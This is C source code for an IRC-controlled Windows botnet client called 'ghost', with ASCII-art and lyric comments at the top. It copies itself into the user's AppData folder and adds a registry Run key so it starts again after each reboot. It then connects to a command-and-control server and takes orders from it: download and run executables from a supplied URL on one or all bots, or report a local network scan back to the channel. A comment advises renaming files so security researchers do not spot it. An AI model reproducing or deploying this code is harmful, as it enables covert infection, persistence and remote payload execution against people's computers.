/*

made by augboi incorporated
established 2002
based out of hoboken NJ

shoot me an email! augustgl@protonmail.ch

*/

/*


  +-'~`---------------------------------/\--						ezekiel 25:17
 ||"""""""""""""""""""""""""""""""" \\\\\\  \/~)
 ||                                  \\\\\\  \/_
  |~~~~~~~~-________________-_________________\ ~--_					The path of the righteous man is beset on all sides by the inequeties of the selfish
  !---------|_________       ------~~~~~(--   )--~~					and the tyranny of evil men. Blessed is he who in the name of charity and goodwill 
                      \ /~~~~\~~\   )--- \_ /(						Shepherds the weak through the valley of darkness, for he his truly his brothers keeper
                       ||     |  | \   ()   \\						and the finder of lost children.
                       \\____/_ / ()\        \\	
                        `~~~~~~~~~-. \        \\					and I will strike down apon thee with great vengeance and furious anger, those who attempt
                                    \ \  <($)> \\					to poison and destroy my brothers, and you will know my name is the LORD 
                                     \ \        \\					when I lay my vengeance apon thee
                                      \ \        \\								
                                       \ \        \\
                                        \ \  ()    \|
                                        _\_\__====~~~

	
	CUZ IT'S SAD, THAT TIME TURNED IT'S BACK ON US
	LIKE A WOOD CHIPPER EATING UP THE LUMBER
	IT TURNS IN THE DUST, IT FLOATS IN THE AIR
	TO PROVE WHAT WE HAVE LOST

*/

#define _CRT_SECURE_NO_WARNINGS

#include "config.h"

#include <windows.h> // dont ask
#include <stdio.h> // printf functions
#include <stdlib.h> // i forgot
#include <winsock.h> // socket functions
#include <time.h> // for random
#include <urlmon.h> // urldownloadtofile
#include <lmcons.h> // i forgot

// link the libraries

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ws2_32.lib")

SOCKET maincommsock; // main socket for communications with server
char msg[256];

// WILL PROBABLY IMPLEMENT THIS FUNCTION IN WINDOWS API

int copyfile(char* source, char* dest) { // copies a file
	FILE* hSource = fopen(source, "r"); // open handle for source

	if (!hSource) {
		return -1;
	}

	FILE* hDest = fopen(dest, "w"); // open handle for dest

	if (!hDest) {
		return -1;
	}

	if (!fseek(hSource, 0L, SEEK_END)) { // look for end of file
		return -1;
	}

	int iPosition = ftell(hSource);

	while (iPosition--) {
		char ch = fgetc(hSource);
		fputc(ch, hDest);
	}
	fclose(hSource);
	fclose(hDest);

	return 0;
}

void install() {
	char user[UNLEN + 1]; // username buffer
	DWORD usernamelen = UNLEN + 1; // length
	GetUserNameA(user, &usernamelen); // get username

	char installdestination[50] = { 0 }; // buffer for install


	/*

	do not leave the directory name as ghost
	do not save this executable as ghost.exe
	change it

	if you don't have fun having a security researcher find that shit

	*/



	sprintf(installdestination, "C:\\Users\\%s\\AppData\\Roaming\\ghost", user); // get path of appdata with usernae
	CreateDirectoryA(installdestination, NULL); // create directory for bot
	char copypath[50]; // path for copy 

	sprintf(copypath, "C:\\Users\\%s\\AppData\\Roaming\\ghost\\ghost.exe", user); // setup path to copy bot to

	TCHAR path[MAX_PATH]; // our path
	DWORD len; // len

	len = GetModuleFileName(NULL, path, MAX_PATH); // get our path

	printf("%s\n", path); // debug

	copyfile(path, copypath); // copy file to new path

	/*FILE* me = fopen(path, "r");
	FILE* copy = fopen(copypath, "w");
	fseek(me, 0L, SEEK_END);
	int position = ftell(me);
	fseek(me, 0L, SEEK_SET);
	while (position--) {
		char ch = fgetc(me);
		fputc(ch, copy);
	}
	fclose(me);
	fclose(copy);*/
}

// I'm not gonna comment this, it's a pretty typical startup function

void startup() {
	char user[UNLEN + 1];
	DWORD usernamelen = UNLEN + 1;
	GetUserNameA(user, &usernamelen);


	HKEY hNewVal;

	char path[50];
	sprintf(path, "C:\\Users\\%s\\AppData\\Roaming\\ghost\\ghost.exe", user);

	RegOpenKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hNewVal);
	RegSetValueA(hNewVal, "ghost", REG_SZ, path, sizeof(path));
	RegCloseKey(hNewVal);
}

// i dont even think this is used

void removeSubstr(char* string, char* sub) {
	char* match;
	int len = strlen(sub);
	while ((match = strstr(string, sub))) {
		*match = '\0';
		strcat(string, match + len);
	}
}

// printf but for a socket

int sockprintf(int sock, const char* words, ...) {
	static char textBuffer[1024];
	va_list args;
	va_start(args, words);
	vsprintf(textBuffer, words, args);
	va_end(args);
	return send(sock, textBuffer, strlen(textBuffer), NULL); // see, it's printf but for a socket. instead of printing, at the end it's a send()
}

// this is kinda useless

typedef BOOL(WINAPI* DnsFlushResolverCacheFuncPtr)();

BOOL flushdnscache(void) {
	HMODULE dnsapi = LoadLibrary(TEXT("dnsapi.dll"));

	if (dnsapi == NULL) {
		printf("[*] COULDN'T LOAD MODULE: %d\n", GetLastError());
		return FALSE;
	}

	DnsFlushResolverCacheFuncPtr dnsflushptr = (DnsFlushResolverCacheFuncPtr)GetProcAddress(dnsapi, "DnsFlushResolverCache");

	if (dnsflushptr == NULL) {
		printf("[*] Failed loading function: %d\n", GetLastError());
		FreeLibrary(dnsapi);
		return FALSE;
	}

	BOOL result = dnsflushptr();

	if (result) {
		printf("[+] DnsFlushResolverCache succeeded\n");
	}
	else {
		printf(" [+] DnsFlushResolverCache succeeded: %d\n", GetLastError());
	}


	FreeLibrary(dnsapi);
	return TRUE;
}

char* addrr(const char* addr)
{
	struct hostent* he = NULL;
	char address[64];

	if (addr == NULL)
		strcpy(address, "");
	else
		strcpy(address, addr);
	he = gethostbyname(address);
	while (!he)Sleep(sleeptime);
	return inet_ntoa(*(struct in_addr*) he->h_addr_list[0]);
}

// generate random string for bot ID

char* rndx(int size)
{
	int k;
	char* buf;
	unsigned int ret;

	buf = (char*)malloc(size + 1);
	memset(buf, '\0', size + 1);
	srand((unsigned int)time(NULL));
	for (k = 0; k < size; k++)
	{
		ret = ((rand() % 26) + 97);
		strcat(buf, (const char*)&ret);
	}

	return buf;
}

const char* nick = rndx(8); // 8 character random bot ID

// parse function

void Parse(char* chCommands) {
	// split string to parse with strtok

	// basically you split the string into an array of strings

	char* token[100];
	token[0] = strtok(chCommands, " \r\n");

	for (int i = 1; i < 10; i++) {
		token[i] = strtok(NULL, " \r\n");
	}

	// strstr used to determine which cmd to use

	if (strstr(token[3], "-test")) { // test function when i first made the bot
		MessageBoxA(
			NULL,
			"hacked by frogcorp",
			"#hackerlife2k20",
			MB_OK
		);
	}

	if (strstr(token[3], "-loadall")) { // load on every bot
		char fileto[MAX_PATH]; // output 
		char* url; // url to download
		url = token[4]; // url = 4th token

		strcpy(fileto, rndx(6)); // random filename
		strcat(fileto, ".exe");

		URLDownloadToFileA(NULL, url, fileto, 0, NULL); // download
		system(fileto); // run, will change later, just did system() for now
		sockprintf(maincommsock, "PRIVMSG %s : DOWNLOADED AND EXECUTED [%s]\n", channel, url); // alert C2 about successful download

		/*sprintf(msg, "PRIVMSG %s : DOWNLOADED AND EXECUTED [%s]\n", channel, url);
		send(maincommsock, msg, strlen(msg), 0);*/
	}

	// same thing, except for one bot

	if (strstr(token[3], "-loadone")) {
		if (token[4] == NULL) { // checks if specified ID
			Sleep(1);
		}
		else if (strcmp(token[4], nick)) { // checks if ID from server is our id
			Sleep(1);
		}
		else { // uwu it is 
			if (token[5] == NULL) { // if URL not specified
				Sleep(1);
			}

			// same thing as before

			else {
				char fileto[MAX_PATH];
				char* url;
				url = token[5];

				strcpy(fileto, rndx(6));
				strcat(fileto, ".exe");

				URLDownloadToFileA(NULL, url, fileto, 0, NULL);
				system(fileto);
				sockprintf(maincommsock, "PRIVMSG %s : DOWNLOADED AND EXECUTED [%s]\n", channel, url);
			}
		}

	}

	// this is stupid, i dont know why I left it here

	if (strstr(token[3], "-listnet")) {
		if (token[4] == NULL) {
			Sleep(1);
		}
		else {
			if (strstr(token[4], nick)) {
				sockprintf(maincommsock, "PRIVMSG %s : RUNNING NETWORK SCAN\n", channel);

				system("arp -a > temp.txt");

				FILE* fp;

				fopen_s(&fp, "temp.txt", "r");

				const size_t line_size = 300;
				char* line = (char*)malloc(line_size);

				while (fgets(line, line_size, fp) != NULL) {
					sockprintf(maincommsock, "PRIVMSG %s : %s\n", channel, line);
				}
				free(line);
			}
			else {
				Sleep(1);
			}
		}
	}

}

// main IRC functions, some cool socket programming ahead get ready bois

DWORD WINAPI ircmain(void) {
	DWORD dwId = 0; 
	HKEY hKey = NULL;
	HANDLE hMutexHandle;

	hMutexHandle = CreateMutexA(0, 0, szMutex); // create mutex so dont run twice

	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		return 0;
	}

	printf("[*] created mutex\r\n");

	struct sockaddr_in addr; // sockaddr_in struct
top:

	Sleep(5000);
	WSAData wsa;
	WSAStartup(MAKEWORD(1, 0), &wsa);

	char buffer[BUFSIZ];
	char* ptr;

	char msg[256], temp[10];

	// commented out because we will be using IP addresses
	//addr.sin_addr.s_addr = inet_addr(addrr(server));

	addr.sin_addr.s_addr = inet_addr(server);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);

	maincommsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	printf("[*] socket created\r\n");

	while (connect(maincommsock, (struct sockaddr*) & addr, sizeof(addr))) {
		flushdnscache();
		WSACleanup();
		closesocket(maincommsock);
		goto top;
	}

	printf("[*] connected\r\n");

	HANDLE hFile, FileHandle;

	hFile = CreateFile(TEXT("new.txt"),
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		sprintf(buffer, "NICK [N]%s\n", rndx(8));
		FileHandle = CreateFile(TEXT("new.txt"), GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
		if (FileHandle != INVALID_HANDLE_VALUE)
			CloseHandle(FileHandle);
		CloseHandle(hFile);
	}

	else sprintf(buffer, "NICK [WINDOWS] %s\n", nick); // send NICK 
	send(maincommsock, buffer, strlen(buffer), 0);



	//sockprintf(maincommsock, "NICK %s\n", rndx(8));

	/*sprintf(buffer, "USER %s\n", user);
	send(maincommsock, buffer, strlen(buffer), 0);*/

	sockprintf(maincommsock, "USER %s\n", user); // send USER

	printf("[*] joined IRC server! hell yeah\r\n");

	while (1) {
		/*sprintf(buffer, "JOIN %s\n", channel);
		send(maincommsock, buffer, strlen(buffer), 0);*/

		sockprintf(maincommsock, "JOIN %s\n", channel); // join channel

		memset(buffer, '\0', BUFSIZ);

		if (recv(maincommsock, buffer, BUFSIZ - 1, 0) <= 0) {
			WSACleanup();
			closesocket(maincommsock);
			goto top;
		}

		else {
			printf("[+] received buffer: %s\r\n", buffer);
 
			if (strstr(buffer, "PING :")) { // check for PING
				ptr = strstr(buffer, "PING :") + strlen("PING :");
				sprintf(msg, "PONG :%s\n", ptr); // send PONG
				send(maincommsock, msg, strlen(msg), 0);
			}
			else if (strstr(buffer, "433")) // no fucking clue
			{
				sprintf(buffer, "NICK %s\n", rndx(8));
				send(maincommsock, msg, strlen(msg), 0);
			}


			else if (strstr(buffer, "PRIVMSG") || strstr(buffer, "NOTICE")) // PRIVMSG, meaning someone just sent a cmd
			{
				Parse(buffer); // parse
			}

		}
	}

	WSACleanup();
	closesocket(maincommsock);

	return TRUE;
}

int main(int argc, char** argv[]) {
	install(); // install bot (in appdata)
	startup(); // add to startup
	ircmain(); // main IRC Function

}
